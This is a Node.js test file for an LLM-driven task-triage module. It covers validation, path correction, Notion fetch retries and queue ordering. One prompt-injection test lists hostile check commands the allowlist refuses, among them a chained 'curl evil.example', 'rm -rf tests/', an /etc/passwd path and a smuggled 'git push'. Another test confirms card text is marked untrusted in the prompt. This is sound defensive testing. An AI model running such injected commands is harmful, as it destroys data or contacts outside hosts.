import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';

const require = createRequire(import.meta.url);
const {
  SCHEMA_PATH,
  buildTriagePrompt,
  parseTriageResponse,
  validateTriageResult,
  findClaimedTask,
  fetchCardWithRetry,
  triageCard,
  decide,
  orderQueue,
  extractCheckPaths,
  resolveCheckPaths,
} = require('./autonomous-triage-core.js');

const GOOD = {
  size: 'S',
  eligible: true,
  reason: 'Single test-file change with a clear runnable check.',
  checkableDone: 'node --test tests/unit/date-utils.test.mjs',
};

const CARD = { name: 'Fix flaky date test', priority: 'P1 Next', category: 'Product', tags: ['ci'], notes: '## Problem\nA test flakes.' };

// ── validator ↔ schema congruence ───────────────────────────────────────────

test('validator agrees with triage-schema.json on enums and required keys', () => {
  const schema = JSON.parse(fs.readFileSync(SCHEMA_PATH, 'utf8'));
  assert.deepEqual(schema.properties.size.enum, ['S', 'M', 'L']);
  assert.deepEqual(schema.required, ['size', 'eligible', 'reason', 'checkableDone']);
  // Every required key missing must be reported.
  const r = validateTriageResult({});
  for (const k of schema.required) assert.ok(r.errors.some(e => e.includes(`"${k}"`)), `missing-${k} unreported`);
});

test('valid results pass; violations are each named', () => {
  assert.deepEqual(validateTriageResult(GOOD), { ok: true, errors: [] });
  assert.equal(validateTriageResult({ ...GOOD, size: 'XL' }).ok, false);
  assert.equal(validateTriageResult({ ...GOOD, eligible: 'yes' }).ok, false);
  assert.equal(validateTriageResult({ ...GOOD, reason: 'short' }).ok, false);
  assert.equal(validateTriageResult({ ...GOOD, extra: 1 }).ok, false);
  // Eligible L without a split proposal is invalid; with a conformant one it
  // passes; ineligible L needs no proposal (the loop won't touch it).
  assert.equal(validateTriageResult({ ...GOOD, size: 'L' }).ok, false);
  assert.equal(validateTriageResult({ ...GOOD, size: 'L', eligible: false }).ok, true);
  const child = { title: 'Child card one', notes: '## Problem\n' + 'x'.repeat(280) + '\n## Suggested approach\ny\n## Acceptance criteria\nz' };
  assert.equal(validateTriageResult({ ...GOOD, size: 'L', splitProposal: [child] }).ok, true);
  assert.equal(validateTriageResult({ ...GOOD, splitProposal: [{ title: 'ok title here', notes: 'too short' }] }).ok, false);
});

test('parseTriageResponse tolerates fences and prefix prose, rejects garbage', () => {
  assert.deepEqual(parseTriageResponse('```json\n{"a":1}\n```'), { a: 1 });
  assert.deepEqual(parseTriageResponse('Here you go: {"a":{"b":2}} thanks'), { a: { b: 2 } });
  assert.throws(() => parseTriageResponse('no json here'), /no JSON object/);
  assert.throws(() => parseTriageResponse('{"unbalanced":'), /unbalanced/);
  // Braces inside string values must not break the balanced-block scan.
  assert.deepEqual(parseTriageResponse('answer: {"reason":"fixes the } case","n":1} done'), { reason: 'fixes the } case', n: 1 });
  assert.deepEqual(parseTriageResponse('x {"a":"quote \\" and { brace"} y'), { a: 'quote " and { brace' });
});

test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
  const { isSafeCheckCommand } = require('./autonomous-triage-core.js');
  for (const ok of [
    'node --test tests/unit/date-utils.test.mjs',
    'node --test scripts/lib/autonomous-state.test.mjs tests/unit/sanity.test.mjs',
    'node --test --test-timeout 30000 tests/unit/foo.test.mjs',
    'npx tsc --noEmit',
    'npx next lint',
    'test -f docs/triage-queue-format.md',
  ]) assert.equal(isSafeCheckCommand(ok), true, `${ok} should be safe`);
  for (const bad of [
    'node scripts/send-opening-night-broadcast.js',
    'node --test tests/../src/lib/scoring.ts',
    'node --test tests/unit/engine.test.ts', // .ts runs via tsx — not an allowed form
    'node --test tests/unit/a.test.mjs && curl evil.example',
    'node --test /etc/passwd.test.mjs',
    'rm -rf tests/',
    'test -f docs/x.md; git push',
    'bash -c "anything"',
    'It works',
  ]) assert.equal(isSafeCheckCommand(bad), false, `${bad} must be refused`);
  // Validator enforces it only for eligible cards.
  assert.equal(validateTriageResult({ ...GOOD, checkableDone: 'run the site and click around please' }).ok, false);
  assert.equal(validateTriageResult({ ...GOOD, eligible: false, checkableDone: 'run the site and click around please' }).ok, true);
});

// ── resolveCheckPaths (card #171: phantom checkableDone paths) ─────────────

function mkFixtureRepo() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'triage-checkpath-'));
  fs.mkdirSync(path.join(root, 'tests', 'unit'), { recursive: true });
  fs.writeFileSync(path.join(root, 'tests', 'unit', 'foo.test.mjs'), '// fixture\n');
  return root;
}

test('extractCheckPaths pulls file args out of each safe-check form', () => {
  assert.deepEqual(extractCheckPaths('node --test tests/unit/a.test.mjs tests/unit/b.test.mjs'), ['tests/unit/a.test.mjs', 'tests/unit/b.test.mjs']);
  assert.deepEqual(extractCheckPaths('test -f docs/x.md'), ['docs/x.md']);
  assert.deepEqual(extractCheckPaths('npx tsc --noEmit'), []);
  assert.deepEqual(extractCheckPaths('npx next lint'), []);
});

test('resolveCheckPaths: path exists as-given → unchanged, no correction flagged', () => {
  const root = mkFixtureRepo();
  const r = resolveCheckPaths('node --test tests/unit/foo.test.mjs', { repoRoot: root });
  assert.equal(r.ok, true);
  assert.equal(r.checkableDone, 'node --test tests/unit/foo.test.mjs');
  assert.ok(!r.corrected);
});

test('resolveCheckPaths: phantom path auto-corrects to the tests/unit/<basename> near-match', () => {
  const root = mkFixtureRepo();
  const r = resolveCheckPaths('node --test tests/foo.test.mjs', { repoRoot: root });
  assert.equal(r.ok, true);
  assert.equal(r.checkableDone, 'node --test tests/unit/foo.test.mjs');
  assert.equal(r.corrected, true);
});

// Card #529: "no file there yet" is the NORMAL case for a fix that ships with
// its own new colocated test (CLAUDE.md §15) — a missing path is only fatal
// when its directory is fabricated too.
test('resolveCheckPaths: missing test with no near-match is accepted as a to-be-created artifact, canonicalized into tests/unit/', () => {
  const root = mkFixtureRepo();
  const r = resolveCheckPaths('node --test tests/bar.test.mjs', { repoRoot: root });
  assert.equal(r.ok, true);
  assert.equal(r.checkableDone, 'node --test tests/unit/bar.test.mjs');
  assert.equal(r.corrected, true);
  assert.deepEqual(r.newPaths, ['tests/unit/bar.test.mjs']);
});

test('resolveCheckPaths: `test -f <new file>` no longer fails closed — the whole point of that form is a file the work creates', () => {
  const root = mkFixtureRepo();
  fs.mkdirSync(path.join(root, 'docs'), { recursive: true });
  const r = resolveCheckPaths('test -f docs/new-runbook.md', { repoRoot: root });
  assert.equal(r.ok, true);
  assert.equal(r.checkableDone, 'test -f docs/new-runbook.md');
  assert.deepEqual(r.newPaths, ['docs/new-runbook.md']);
});

test('resolveCheckPaths: fabricated DIRECTORY still fails closed', () => {
  const root = mkFixtureRepo();
  const r = resolveCheckPaths('node --test src/madeup/deep/bar.test.mjs', { repoRoot: root });
  assert.equal(r.ok, false);
  assert.match(r.reason, /directory that does not exist on disk: src\/madeup\/deep\/bar\.test\.mjs/);
});

test('resolveCheckPaths: an existing near-match still WINS over creating a new file (card #171 protection is unchanged)', () => {
  const root = mkFixtureRepo();
  const r = resolveCheckPaths('node --test tests/foo.test.mjs', { repoRoot: root });
  assert.equal(r.checkableDone, 'node --test tests/unit/foo.test.mjs');
  assert.deepEqual(r.newPaths, []); // corrected onto the real file, nothing to create
});

// ship-check (Codex + Opus QA, 2026-07-26): the canonicalization must not
// relocate a deliberate non-unit suite. tests/{e2e,smoke,integration,fixtures}
// all exist in the real tree.
test('resolveCheckPaths: a new test in a tests/ SUBDIRECTORY is created there, never relocated into tests/unit/', () => {
  const root = mkFixtureRepo();
  fs.mkdirSync(path.join(root, 'tests', 'e2e'), { recursive: true });
  const r = resolveCheckPaths('node --test tests/e2e/login-flow.test.mjs', { repoRoot: root });
  assert.equal(r.ok, true);
  assert.equal(r.checkableDone, 'node --test tests/e2e/login-flow.test.mjs'); // unchanged
  assert.deepEqual(r.newPaths, ['tests/e2e/login-flow.test.mjs']);
});

test('resolveCheckPaths: an existing DIRECTORY is refused — `test -f <dir>` can never pass', () => {
  const root = mkFixtureRepo();
  fs.mkdirSync(path.join(root, 'scripts', 'lib'), { recursive: true });
  const r = resolveCheckPaths('test -f scripts/lib', { repoRoot: root });
  assert.equal(r.ok, false);
  assert.match(r.reason, /names a directory, not a file: scripts\/lib/);
});

test('resolveCheckPaths: a repeated path token is rewritten in EVERY position, not just the first', () => {
  const root = mkFixtureRepo();
  const r = resolveCheckPaths('node --test tests/dup.test.mjs tests/dup.test.mjs', { repoRoot: root });
  assert.equal(r.ok, true);
  assert.equal(r.checkableDone, 'node --test tests/unit/dup.test.mjs tests/unit/dup.test.mjs');
  assert.deepEqual(r.newPaths, ['tests/unit/dup.test.mjs']); // deduped
});

test('resolveCheckPaths: a multi-path command mixing an existing and a new test resolves both', () => {
  const root = mkFixtureRepo();
  const r = resolveCheckPaths('node --test tests/unit/foo.test.mjs tests/unit/brand-new.test.mjs', { repoRoot: root });
  assert.equal(r.ok, true);
  assert.deepEqual(r.newPaths, ['tests/unit/brand-new.test.mjs']);
});

test('resolveCheckPaths: tsc/lint forms carry no path args → pass through', () => {
  const root = mkFixtureRepo();
  assert.deepEqual(resolveCheckPaths('npx tsc --noEmit', { repoRoot: root }), { ok: true, checkableDone: 'npx tsc --noEmit' });
});

test('resolveCheckPaths: never guesses across directory families — a missing scripts/ path is not "corrected" against a same-basename tests/unit/ file', () => {
  const root = mkFixtureRepo();
  // foo.test.mjs exists at tests/unit/foo.test.mjs (from mkFixtureRepo), but
  // the command names scripts/foo.test.mjs — a different, unrelated file
  // that happens to share a basename. Must fail closed, not cross-correct.
  const r = resolveCheckPaths('node --test scripts/foo.test.mjs', { repoRoot: root });
  assert.equal(r.ok, false);
  assert.match(r.reason, /scripts\/foo\.test\.mjs/);
  assert.doesNotMatch(r.reason, /tried near-match/);
});

test('resolveCheckPaths against the REAL repo tree: reproduces the exact card #171 incident', () => {
  // tests/review-write-guard.test.mjs never existed; the real file is
  // tests/unit/review-write-guard.test.mjs — this is the literal phantom
  // path the lint-violator card's triage verdict produced.
  const r = resolveCheckPaths('node --test tests/review-write-guard.test.mjs');
  assert.equal(r.ok, true);
  assert.equal(r.checkableDone, 'node --test tests/unit/review-write-guard.test.mjs');
  assert.equal(r.corrected, true);
});

test('triageCard: LLM verdict with a phantom checkableDone path is auto-corrected, stays attempt-eligible', async () => {
  const root = mkFixtureRepo();
  const verdict = { ...GOOD, checkableDone: 'node --test tests/foo.test.mjs' };
  const r = await triageCard(CARD, async () => JSON.stringify(verdict), { repoRoot: root });
  assert.equal(r.triage.eligible, true);
  assert.equal(r.triage.checkableDone, 'node --test tests/unit/foo.test.mjs');
  assert.equal(decide(r), 'attempt');
});

test('triageCard: LLM verdict naming a fabricated DIRECTORY is marked ineligible, never queued', async () => {
  const root = mkFixtureRepo();
  const verdict = { ...GOOD, checkableDone: 'node --test src/nowhere/nope.test.mjs' };
  const r = await triageCard(CARD, async () => JSON.stringify(verdict), { repoRoot: root });
  assert.equal(r.triage.eligible, false);
  assert.match(r.triage.reason, /check-path-missing/);
  assert.equal(decide(r), 'skip');
});

// Card #529: this is the case that cost the 2026-07-26 live run three in-scope
// cards (review-census, watchlist-rate-control, opening-night-checklist) —
// each named the test its own fix would write and was skipped for it.
test('triageCard: a check naming a test the work will CREATE stays attempt-eligible and reports newCheckPaths', async () => {
  const root = mkFixtureRepo();
  const verdict = { ...GOOD, checkableDone: 'node --test tests/unit/review-census.test.mjs' };
  const r = await triageCard(CARD, async () => JSON.stringify(verdict), { repoRoot: root });
  assert.equal(r.triage.eligible, true);
  assert.equal(decide(r), 'attempt');
  assert.deepEqual(r.newCheckPaths, ['tests/unit/review-census.test.mjs']);
});

test('triageCard: a check against an EXISTING file carries no newCheckPaths', async () => {
  const root = mkFixtureRepo();
  const verdict = { ...GOOD, checkableDone: 'node --test tests/unit/foo.test.mjs' };
  const r = await triageCard(CARD, async () => JSON.stringify(verdict), { repoRoot: root });
  assert.equal(r.triage.eligible, true);
  assert.equal(r.newCheckPaths, undefined);
});

// ── fetchCardWithRetry (card #529: 2 cards lost to transient Notion blips) ──

test('fetchCardWithRetry: a transient first failure is retried and recovers', async () => {
  let calls = 0;
  const slept = [];
  const r = await fetchCardWithRetry('card-1', async () => {
    calls++;
    if (calls === 1) throw new Error('socket hang up');
    return { id: 'card-1', name: 'Real card' };
  }, { sleepFn: async ms => { slept.push(ms); } });
  assert.equal(r.ok, true);
  assert.equal(r.attempts, 2);
  assert.equal(r.card.name, 'Real card');
  assert.deepEqual(slept, [1500]);
});

test('fetchCardWithRetry: a first-try success never retries and never sleeps', async () => {
  let calls = 0;
  const slept = [];
  const r = await fetchCardWithRetry('card-1', async () => { calls++; return { id: 'card-1' }; }, { sleepFn: async ms => slept.push(ms) });
  assert.equal(r.ok, true);
  assert.equal(r.attempts, 1);
  assert.equal(calls, 1);
  assert.deepEqual(slept, []);
  assert.equal(r.permanent, false, 'permanent must be an explicit false on success, never undefined');
});

test('fetchCardWithRetry: a persistently transient failure gives up after the bounded retry, carrying the last error', async () => {
  let calls = 0;
  const r = await fetchCardWithRetry('flaky-id', async () => { calls++; throw new Error(`socket hang up (attempt ${calls})`); }, { sleepFn: async () => {} });
  assert.equal(r.ok, false);
  assert.equal(r.attempts, 2);
  assert.equal(calls, 2); // bounded — never a retry storm
  assert.match(r.error.message, /attempt 2/);
});

// ship-check (Codex): a deleted/mistyped card id 404s identically every time.
// Retrying it buys nothing and, across a 120-card fetch, a systematic auth or
// id failure would add minutes of pure sleep plus 120 wasted subprocesses.
// ship-check round 2: a 5xx whose BODY quotes a Notion error code, or a stack
// trace containing "403", must not be mistaken for a permanent failure — that
// would cost the card its night for a blip, the exact bug this retry fixes.
test('fetchCardWithRetry: transient wins — a 5xx or rate-limit still retries even when the body quotes a permanent-looking code', async () => {
  for (const msg of [
    'HTTP 502: upstream said {"code":"object_not_found"}',
    'HTTP 504 gateway timeout — could not find page',
    'HTTP 429 rate limited (retry after 2s)',
    'ETIMEDOUT at Object.<anonymous> (/x/403.js:1:1)',
  ]) {
    let calls = 0;
    const r = await fetchCardWithRetry('blip', async () => { calls++; throw new Error(msg); }, { sleepFn: async () => {} });
    assert.equal(calls, 2, `${msg} must retry`);
    assert.equal(r.permanent, false, msg);
  }
});

// Not a synthetic string: this is the VERBATIM message a real
// `node scripts/notion-brain.js get <nonexistent-id>` produced through
// execFileSync on 2026-07-26. Regexes that only ever see strings their own
// author wrote are tautological — this pins the classifier to the shape the
// Notion SDK actually emits, so an SDK message change fails the test instead
// of silently turning every 404 into a retry.
const REAL_NOTION_404 = `Command failed: node scripts/notion-brain.js get 00000000-0000-0000-0000-000000000000
@notionhq/client warn: request fail {
  code: 'object_not_found',
  message: 'Could not find page with ID: 00000000-0000-0000-0000-000000000000. Make sure the relevant pages and databases are shared with your integration "BWSC Action Dispatcher".',
  attempt: 0,
  requestId: 'c02361b6-f434-43cb-b18a-340483d7087f'
}
Error: Could not find page with ID: 00000000-0000-0000-0000-000000000000.`;

// The whole permanent-vs-transient classifier reads err.MESSAGE, and it only
// works because Node's execFileSync folds the child's stderr INTO the thrown
// error's message. Ship-check round 3 asserted the opposite (that the Notion
// text lands only on err.stderr, making the permanent branch dead code); an
// empirical probe on 2026-07-26 disproved it — err.message was 978 chars and
// contained both "Could not find page" and "object_not_found". This test pins
// that Node behaviour hermetically (no Notion, no network, no API key), so if
// a future Node release ever stops folding stderr in, THIS fails and names the
// reason instead of every 404 silently starting to burn a retry.
test('execFileSync folds child stderr into err.message — the assumption the whole classifier rests on', () => {
  let err = null;
  try {
    execFileSync(process.execPath, ['-e', 'console.error("Could not find page with ID: xyz"); process.exit(1)'], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (e) { err = e; }
  assert.ok(err, 'the child must fail');
  assert.match(String(err.message), /Could not find page with ID: xyz/,
    'execFileSync no longer folds stderr into err.message — isTransientFetchError reads err.message and would stop seeing Notion error text');
});

test('fetchCardWithRetry: the REAL notion-brain 404 text is classified permanent and never retried', async () => {
  let calls = 0;
  const slept = [];
  const r = await fetchCardWithRetry('gone', async () => { calls++; throw new Error(REAL_NOTION_404); }, { sleepFn: async ms => slept.push(ms) });
  assert.equal(r.ok, false);
  assert.equal(calls, 1, 'a real deleted-card 404 must not burn a retry');
  assert.equal(r.permanent, true);
  assert.deepEqual(slept, []);
});

test('fetchCardWithRetry: a PERMANENT failure (404 / auth) is never retried', async () => {
  for (const msg of ['Notion API status: 404 {"code":"object_not_found"}', 'HTTP 401 unauthorized', 'Could not find page with ID abc']) {
    let calls = 0;
    const slept = [];
    const r = await fetchCardWithRetry('gone', async () => { calls++; throw new Error(msg); }, { sleepFn: async ms => slept.push(ms) });
    assert.equal(r.ok, false, msg);
    assert.equal(calls, 1, `${msg} must not retry`);
    assert.equal(r.attempts, 1, msg);
    assert.equal(r.permanent, true, msg);
    assert.deepEqual(slept, [], `${msg} must not sleep`);
  }
});

// ── findClaimedTask (claim visibility, night-2 fix) ─────────────────────────

// taskState shape: { notionMap: {[pageId]: {taskId}}, tasksById: {[taskId]: task} }
function mkTaskState(notionMap, tasksById) { return { notionMap, tasksById }; }

test('findClaimedTask: mapped taskId in_progress + marker present → claimed', () => {
  const ts = mkTaskState(
    { 'abc-123': { taskId: '151' } },
    { 151: { id: '151', status: 'in_progress', description: '[notion:abc-123] P1 Next · Not started · Admin\nsome notes' } },
  );
  const hit = findClaimedTask('abc-123', ts);
  assert.ok(hit);
  assert.equal(hit.id, '151');
});

test('findClaimedTask: mapped taskId not in_progress → not claimed', () => {
  const ts = mkTaskState(
    { 'abc-123': { taskId: '151' } },
    { 151: { id: '151', status: 'pending', description: '[notion:abc-123] P1' } },
  );
  assert.equal(findClaimedTask('abc-123', ts), null);
});

test('findClaimedTask: no map entry for this card → not claimed', () => {
  const ts = mkTaskState({}, { 151: { id: '151', status: 'in_progress', description: '[notion:other]' } });
  assert.equal(findClaimedTask('abc-123', ts), null);
});

test('findClaimedTask: id-reuse guard — mapped taskId in_progress but marker belongs to a DIFFERENT card (numeric id reused by a live session) → not trusted', () => {
  const ts = mkTaskState(
    { 'abc-123': { taskId: '151' } },
    { 151: { id: '151', status: 'in_progress', description: '[notion:some-unrelated-card] fresh native task, id 151 reused' } },
  );
  assert.equal(findClaimedTask('abc-123', ts), null);
});

test('findClaimedTask: fails safe on missing id, missing/empty taskState, malformed entries', () => {
  const ts = mkTaskState({ x: { taskId: '1' } }, { 1: { id: '1', status: 'in_progress', description: '[notion:x]' } });
  assert.equal(findClaimedTask(null, ts), null);
  assert.equal(findClaimedTask('x', null), null);
  assert.equal(findClaimedTask('x', undefined), null);
  assert.equal(findClaimedTask('x', mkTaskState({}, {})), null);
  assert.equal(findClaimedTask('x', mkTaskState({ x: { taskId: '9' } }, {})), null); // taskId not in tasksById
  assert.equal(findClaimedTask('x', mkTaskState({ x: { taskId: '1' } }, { 1: { id: '1', status: 'in_progress' } })), null); // no description field
});

// ── triageCard flow ─────────────────────────────────────────────────────────

test('a card claimed in-flight (shared task in_progress) skips without an LLM call', async () => {
  let calls = 0;
  const taskState = mkTaskState(
    { 'card-42': { taskId: '151' } },
    { 151: { id: '151', status: 'in_progress', description: '[notion:card-42] P1 Next · Not started · Admin' } },
  );
  const r = await triageCard({ ...CARD, id: 'card-42' }, async () => { calls++; return JSON.stringify(GOOD); }, { taskState });
  assert.equal(calls, 0);
  assert.equal(r.preFilter.eligible, false);
  assert.match(r.preFilter.reason, /claimed in-flight/);
  assert.match(r.preFilter.reason, /#151/);
  assert.equal(decide(r), 'skip');
});

test('a card with no matching claimed task proceeds to normal pre-filter/LLM flow', async () => {
  const taskState = mkTaskState(
    { 'some-other-card': { taskId: '151' } },
    { 151: { id: '151', status: 'in_progress', description: '[notion:some-other-card] P1 Next · Not started · Admin' } },
  );
  let calls = 0;
  const r = await triageCard({ ...CARD, id: 'card-42' }, async () => { calls++; return JSON.stringify(GOOD); }, { taskState });
  assert.equal(calls, 1);
  assert.equal(decide(r), 'attempt');
});

test('a claimed-but-completed task does not block re-triage', async () => {
  const taskState = mkTaskState(
    { 'card-42': { taskId: '151' } },
    { 151: { id: '151', status: 'completed', description: '[notion:card-42] P1 Next · Done · Admin' } },
  );
  let calls = 0;
  const r = await triageCard({ ...CARD, id: 'card-42' }, async () => { calls++; return JSON.stringify(GOOD); }, { taskState });
  assert.equal(calls, 1);
  assert.equal(decide(r), 'attempt');
});

// ── attempt-memory park (owner mandate 2026-07-30, task #635) ──────────────

test('a card parked by attempt memory (failed twice unchanged) skips without an LLM call', async () => {
  const { computeContentHash } = require('./attempt-memory.js');
  const card = { ...CARD, id: 'card-99' };
  const hash = computeContentHash(card);
  const ledgerEntries = [
    { ts: '2026-07-28T02:00:00Z', event: 'card-fail', cardId: 'card-99', contentHash: hash, note: 'checks-failed: tsc' },
    { ts: '2026-07-29T02:00:00Z', event: 'card-fail', cardId: 'card-99', contentHash: hash, note: 'checks-failed: lint' },
  ];
  let calls = 0;
  const r = await triageCard(card, async () => { calls++; return JSON.stringify(GOOD); }, { attemptMemory: { ledgerEntries } });
  assert.equal(calls, 0);
  assert.equal(r.preFilter.eligible, false);
  assert.match(r.preFilter.reason, /^parked: failed 2x unchanged/);
  assert.equal(decide(r), 'skip');
});

test('a card with only one prior failure is NOT parked and still reaches the LLM', async () => {
  const { computeContentHash } = require('./attempt-memory.js');
  const card = { ...CARD, id: 'card-98' };
  const hash = computeContentHash(card);
  const ledgerEntries = [{ ts: '2026-07-28T02:00:00Z', event: 'card-fail', cardId: 'card-98', contentHash: hash, note: 'timeout' }];
  let calls = 0;
  const r = await triageCard(card, async () => { calls++; return JSON.stringify(GOOD); }, { attemptMemory: { ledgerEntries } });
  assert.equal(calls, 1);
  assert.equal(decide(r), 'attempt');
});

test('editing the card (notes change → hash changes) un-parks it even after 2 prior failures', async () => {
  const { computeContentHash } = require('./attempt-memory.js');
  const card = { ...CARD, id: 'card-97' };
  const oldHash = computeContentHash(card);
  const editedCard = { ...card, notes: card.notes + '\nEdited with a fix attempt.' };
  const ledgerEntries = [
    { ts: '2026-07-28T02:00:00Z', event: 'card-fail', cardId: 'card-97', contentHash: oldHash, note: 'checks-failed' },
    { ts: '2026-07-29T02:00:00Z', event: 'card-fail', cardId: 'card-97', contentHash: oldHash, note: 'checks-failed' },
  ];
  let calls = 0;
  const r = await triageCard(editedCard, async () => { calls++; return JSON.stringify(GOOD); }, { attemptMemory: { ledgerEntries } });
  assert.equal(calls, 1);
  assert.equal(decide(r), 'attempt');
});

test('omitting opts.attemptMemory entirely leaves triageCard unaffected (backward compatible)', async () => {
  let calls = 0;
  const r = await triageCard({ ...CARD, id: 'card-96' }, async () => { calls++; return JSON.stringify(GOOD); });
  assert.equal(calls, 1);
  assert.equal(decide(r), 'attempt');
});

// ── triageCard flow ─────────────────────────────────────────────────────────

test('pre-filter refusal short-circuits: no LLM call for deny-tag cards', async () => {
  let calls = 0;
  const r = await triageCard({ ...CARD, tags: ['scoring'] }, async () => { calls++; return JSON.stringify(GOOD); });
  assert.equal(calls, 0);
  assert.equal(r.preFilter.eligible, false);
  assert.equal(decide(r), 'skip');
});

test('happy path: one call, validated verdict', async () => {
  const prompts = [];
  const r = await triageCard(CARD, async p => { prompts.push(p); return JSON.stringify(GOOD); });
  assert.equal(prompts.length, 1);
  assert.deepEqual(r.triage, GOOD);
  assert.equal(decide(r), 'attempt');
  // Prompt safety: card text is declared untrusted, contract minimums inlined.
  assert.match(prompts[0], /UNTRUSTED/);
  assert.match(prompts[0], /Fix flaky date test/);
});

test('garbled response → exactly one retry echoing errors → failed("triage")', async () => {
  const prompts = [];
  const r = await triageCard(CARD, async p => { prompts.push(p); return 'sorry, I cannot produce JSON'; });
  assert.equal(prompts.length, 2, 'exactly one retry');
  assert.match(prompts[1], /failed validation/);
  assert.equal(r.failed, 'triage');
  assert.equal(r.attempts, 2);
  assert.ok(r.error.length > 0);
  assert.equal(decide(r), 'failed');
});

test('invalid-then-corrected: retry echoes the specific validation error and succeeds', async () => {
  const prompts = [];
  let n = 0;
  const r = await triageCard(CARD, async p => {
    prompts.push(p);
    n++;
    return n === 1 ? JSON.stringify({ ...GOOD, size: 'XL' }) : JSON.stringify(GOOD);
  });
  assert.match(prompts[1], /size must be one of S\/M\/L/);
  assert.deepEqual(r.triage, GOOD);
});

test('LLM transport errors count as attempts and never throw', async () => {
  const r = await triageCard(CARD, async () => { throw new Error('HTTP 529'); });
  assert.equal(r.failed, 'triage');
  assert.match(r.error, /529/);
});

// ── decisions + ordering ────────────────────────────────────────────────────

test('decide: LLM can narrow but never widen eligibility', () => {
  assert.equal(decide({ preFilter: { eligible: true }, triage: { ...GOOD, eligible: false } }), 'skip');
  assert.equal(decide({ preFilter: { eligible: false, reason: 'x' } }), 'skip');
  assert.equal(decide({ preFilter: { eligible: true }, triage: { ...GOOD, size: 'L', eligible: true } }), 'split');
});

test('orderQueue: P0 before P1, S before M, stable by name', () => {
  const mk = (name, priority, size) => ({ card: { name, priority }, triage: { ...GOOD, size }, decision: 'attempt' });
  const q = orderQueue([
    mk('b-card', 'P1 Next', 'S'),
    mk('a-card', 'P1 Next', 'S'),
    mk('m-card', 'P0 Now', 'M'),
    mk('s-card', 'P0 Now', 'S'),
    { card: { name: 'skipped', priority: 'P0 Now' }, decision: 'skip' },
  ]);
  assert.deepEqual(q.map(e => e.card.name), ['s-card', 'm-card', 'a-card', 'b-card']);
});

// ── Tier 3 (owner-approved 2026-07-25) ─────────────────────────────────────

test('safe-check forms accept src/ test paths and src/scripts test -f targets', () => {
  const { isSafeCheckCommand } = require('./autonomous-triage-core.js');
  for (const ok of [
    'node --test src/lib/foo.test.mjs',
    'node --test scripts/lib/foo.test.mjs src/lib/bar.test.mjs',
    'test -f src/components/Foo.tsx',
    'test -f scripts/lib/foo.js',
  ]) assert.equal(isSafeCheckCommand(ok), true, `${ok} should be safe`);
});

test('mutation deny-list: check commands may never reference data-writing scripts', () => {
  const { isSafeCheckCommand } = require('./autonomous-triage-core.js');
  for (const bad of [
    'test -f scripts/rebuild-all-reviews.js',
    'test -f scripts/gather-reviews.js',
    'test -f scripts/collect-review-texts.js',
    'test -f scripts/push-core-data.js',
    'test -f scripts/send-opening-night-broadcast.js',
    'node --test scripts/rebuild-all-reviews.js',   // also fails the .test.mjs shape
  ]) assert.equal(isSafeCheckCommand(bad), false, `${bad} must be refused`);
  // a .test.mjs file whose name shares the push- prefix is a harmless test
  // run, not a mutating script — the deny-list targets executable .js only
  assert.equal(isSafeCheckCommand('node --test scripts/lib/push-with-retry.test.mjs'), true, 'test files stay runnable');
});

test('triage prompt derives scope prose from describeScope per tier', () => {
  const t1 = buildTriagePrompt({ name: 'x', notes: 'y' });
  assert.match(t1, /Tier 1: may only edit/);
  assert.doesNotMatch(t1, /Tier 3/);
  const t3 = buildTriagePrompt({ name: 'x', notes: 'y' }, 3);
  assert.match(t3, /Tier 3 \(code\): may edit src\/\*\* and scripts\/\*\*/);
  assert.match(t3, /Tier-3 paths/);   // eligibility question names the active tier
  assert.doesNotMatch(t3, /cannot: touch src\//);  // old hardcoded prose is gone
});

test('mutation deny-list covers case variants and .mjs/.cjs (ship-check QA)', () => {
  const { isSafeCheckCommand } = require('./autonomous-triage-core.js');
  for (const bad of ['test -f scripts/PUSH-x.js', 'test -f scripts/push-core-data.mjs', 'test -f scripts/Send-Alert.cjs']) {
    assert.equal(isSafeCheckCommand(bad), false, bad);
  }
  assert.equal(isSafeCheckCommand('node --test scripts/lib/push-with-retry.test.mjs'), true, 'test files stay runnable');
});
